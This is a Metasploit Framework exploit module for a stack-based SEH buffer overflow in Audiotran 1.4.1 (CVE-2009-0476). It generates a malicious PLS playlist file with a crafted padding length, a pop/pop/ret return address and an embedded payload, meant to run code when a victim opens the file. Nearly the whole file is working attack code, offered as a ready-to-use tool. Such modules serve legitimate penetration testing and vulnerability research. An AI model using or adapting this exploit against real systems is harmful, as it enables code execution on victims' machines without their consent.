##
# $Id: audiotran_pls.rb 8306 2010-01-28 21:04:01Z swtornio $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Audiotran 1.4.1 (PLS File) Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in Audiotran 1.4.1.
				An attacker must send the file to victim and the victim must open the file.
				Alternatively it may be possible to execute code remotely via an embedded
				PLS file within a browser, when the PLS extention is registered to Audiotran.
				This functionality has not been tested in this module.
			},
			'License'        => MSF_LICENSE,
			'Author' 	 =>
				[
					'Sebastien Duquette',
					'dookie',
				],
			'Version'        => '$Revision: 8306 $',
			'References'     =>
				[
					[ 'CVE', '2009-0476'],
					[ 'OSVDB', '55424'],
					[ 'URL', 'http://www.exploit-db.com/exploits/11079' ],
				],
			'Payload'        =>
				{
					'Space'    => 6000,
					'BadChars' => "\x00\x0a\x3d",
					'StackAdjustment' => -3500,
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'Windows Universal', { 'Ret' => 0x10101A3E } ], #p/p/r in rsaadjd.tmp
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Jan 09 2010',
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('FILENAME', [ true, 'The file name.',  'msf.pls']),
				], self.class)

	end

	def exploit

		sploit = rand_text_alpha_upper(1308)
		sploit << generate_seh_payload(target.ret)
		sploit << rand_text_alpha_upper(8000)

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(sploit)

	end

end